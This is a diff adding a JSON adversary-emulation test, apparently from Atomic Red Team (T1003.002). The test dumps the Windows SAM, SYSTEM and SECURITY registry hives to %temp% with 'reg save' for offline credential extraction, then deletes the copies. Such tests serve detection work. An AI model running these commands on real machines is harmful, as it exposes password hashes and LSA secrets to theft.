@@ -1,0 +1,44 @@
+{
+  "id": "5c2571d0-1572-416d-9676-812e64ca9f44",
+  "name": "Registry dump of SAM, creds, and secrets",
+  "description": "Local SAM (SAM \u0026 System), cached credentials (System \u0026 Security) and LSA secrets (System \u0026 Security) can be enumerated\nvia three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7\n\nUpon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "41d609af-24c8-488b-87f3-9e5550628f3e",
+      "type": "execute-command",
+      "data": {
+        "command": "reg save HKLM\\sam %temp%\\sam\nreg save HKLM\\system %temp%\\system\nreg save HKLM\\security %temp%\\security\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "bab40892-ddbc-46e0-945d-9409d037bf55",
+      "type": "execute-command",
+      "data": {
+        "command": "del %temp%\\sam \u003enul 2\u003e nul\ndel %temp%\\system \u003enul 2\u003e nul\ndel %temp%\\security \u003enul 2\u003e nul\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "41d609af-24c8-488b-87f3-9e5550628f3e",
+      "p": "on-success",
+      "o": "bab40892-ddbc-46e0-945d-9409d037bf55"
+    },
+    {
+      "s": "41d609af-24c8-488b-87f3-9e5550628f3e",
+      "p": "on-failure",
+      "o": "bab40892-ddbc-46e0-945d-9409d037bf55"
+    }
+  ],
+  "tags": [
+    "T1003.002",
+    "atomic-red-team"
+  ]
+}
